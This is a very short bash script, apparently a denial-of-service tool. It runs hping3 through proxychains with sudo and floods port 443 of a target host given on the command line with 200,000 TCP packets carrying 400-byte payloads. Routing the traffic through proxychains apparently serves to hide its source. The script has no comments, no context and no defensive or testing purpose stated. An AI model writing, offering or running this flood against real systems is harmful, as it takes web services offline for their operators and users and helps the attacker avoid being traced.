#!/bin/bash

sudo proxychains hping3 -c 200000 -d 400 -PA --flood -p 443 "$1"
